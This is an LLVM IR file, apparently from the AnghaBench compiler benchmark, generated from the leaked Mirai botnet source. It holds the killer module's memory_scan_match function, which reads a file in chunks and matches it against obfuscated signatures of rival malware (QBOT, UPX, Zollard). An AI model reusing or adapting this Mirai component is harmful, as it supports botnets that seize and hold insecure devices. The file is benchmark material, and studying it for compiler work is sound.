; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_killer.c_memory_scan_match.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_killer.c_memory_scan_match.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@FALSE = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@TABLE_MEM_QBOT = common dso_local global i32 0, align 4
@TABLE_MEM_QBOT2 = common dso_local global i32 0, align 4
@TABLE_MEM_QBOT3 = common dso_local global i32 0, align 4
@TABLE_MEM_UPX = common dso_local global i32 0, align 4
@TABLE_MEM_ZOLLARD = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @memory_scan_match to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @memory_scan_match(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [4096 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %18 = load i32, i32* @FALSE, align 4
  store i32 %18, i32* %17, align 4
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* @O_RDONLY, align 4
  %21 = call i32 @open(i8* %19, i32 %20)
  store i32 %21, i32* %4, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

23:                                               ; preds = %1
  %24 = load i32, i32* @FALSE, align 4
  store i32 %24, i32* %2, align 4
  br label %103

25:                                               ; preds = %1
  %26 = load i32, i32* @TABLE_MEM_QBOT, align 4
  %27 = call i32 @table_unlock_val(i32 %26)
  %28 = load i32, i32* @TABLE_MEM_QBOT2, align 4
  %29 = call i32 @table_unlock_val(i32 %28)
  %30 = load i32, i32* @TABLE_MEM_QBOT3, align 4
  %31 = call i32 @table_unlock_val(i32 %30)
  %32 = load i32, i32* @TABLE_MEM_UPX, align 4
  %33 = call i32 @table_unlock_val(i32 %32)
  %34 = load i32, i32* @TABLE_MEM_ZOLLARD, align 4
  %35 = call i32 @table_unlock_val(i32 %34)
  %36 = load i32, i32* @TABLE_MEM_QBOT, align 4
  %37 = call i8* @table_retrieve_val(i32 %36, i32* %12)
  store i8* %37, i8** %7, align 8
  %38 = load i32, i32* @TABLE_MEM_QBOT2, align 4
  %39 = call i8* @table_retrieve_val(i32 %38, i32* %13)
  store i8* %39, i8** %8, align 8
  %40 = load i32, i32* @TABLE_MEM_QBOT3, align 4
  %41 = call i8* @table_retrieve_val(i32 %40, i32* %14)
  store i8* %41, i8** %9, align 8
  %42 = load i32, i32* @TABLE_MEM_UPX, align 4
  %43 = call i8* @table_retrieve_val(i32 %42, i32* %15)
  store i8* %43, i8** %10, align 8
  %44 = load i32, i32* @TABLE_MEM_ZOLLARD, align 4
  %45 = call i8* @table_retrieve_val(i32 %44, i32* %16)
  store i8* %45, i8** %11, align 8
  br label %46

46:                                               ; preds = %88, %25
  %47 = load i32, i32* %4, align 4
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %49 = call i32 @read(i32 %47, i8* %48, i32 4096)
  store i32 %49, i32* %5, align 4
  %50 = icmp sgt i32 %49, 0
  br i1 %50, label %51, label %89

51:                                               ; preds = %46
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %53 = load i32, i32* %5, align 4
  %54 = load i8*, i8** %7, align 8
  %55 = load i32, i32* %12, align 4
  %56 = call i64 @mem_exists(i8* %52, i32 %53, i8* %54, i32 %55)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %86, label %58

58:                                               ; preds = %51
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %60 = load i32, i32* %5, align 4
  %61 = load i8*, i8** %8, align 8
  %62 = load i32, i32* %13, align 4
  %63 = call i64 @mem_exists(i8* %59, i32 %60, i8* %61, i32 %62)
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %86, label %65

65:                                               ; preds = %58
  %66 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %67 = load i32, i32* %5, align 4
  %68 = load i8*, i8** %9, align 8
  %69 = load i32, i32* %14, align 4
  %70 = call i64 @mem_exists(i8* %66, i32 %67, i8* %68, i32 %69)
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %86, label %72

72:                                               ; preds = %65
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %74 = load i32, i32* %5, align 4
  %75 = load i8*, i8** %10, align 8
  %76 = load i32, i32* %15, align 4
  %77 = call i64 @mem_exists(i8* %73, i32 %74, i8* %75, i32 %76)
  %78 = icmp ne i64 %77, 0
  br i1 %78, label %86, label %79

79:                                               ; preds = %72
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %81 = load i32, i32* %5, align 4
  %82 = load i8*, i8** %11, align 8
  %83 = load i32, i32* %16, align 4
  %84 = call i64 @mem_exists(i8* %80, i32 %81, i8* %82, i32 %83)
  %85 = icmp ne i64 %84, 0
  br i1 %85, label %86, label %88

86:                                               ; preds = %79, %72, %65, %58, %51
  %87 = load i32, i32* @TRUE, align 4
  store i32 %87, i32* %17, align 4
  br label %89

88:                                               ; preds = %79
  br label %46

89:                                               ; preds = %86, %46
  %90 = load i32, i32* @TABLE_MEM_QBOT, align 4
  %91 = call i32 @table_lock_val(i32 %90)
  %92 = load i32, i32* @TABLE_MEM_QBOT2, align 4
  %93 = call i32 @table_lock_val(i32 %92)
  %94 = load i32, i32* @TABLE_MEM_QBOT3, align 4
  %95 = call i32 @table_lock_val(i32 %94)
  %96 = load i32, i32* @TABLE_MEM_UPX, align 4
  %97 = call i32 @table_lock_val(i32 %96)
  %98 = load i32, i32* @TABLE_MEM_ZOLLARD, align 4
  %99 = call i32 @table_lock_val(i32 %98)
  %100 = load i32, i32* %4, align 4
  %101 = call i32 @close(i32 %100)
  %102 = load i32, i32* %17, align 4
  store i32 %102, i32* %2, align 4
  br label %103

103:                                              ; preds = %89, %23
  %104 = load i32, i32* %2, align 4
  ret i32 %104
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @table_unlock_val(i32) #1

declare dso_local i8* @table_retrieve_val(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i64 @mem_exists(i8*, i32, i8*, i32) #1

declare dso_local i32 @table_lock_val(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
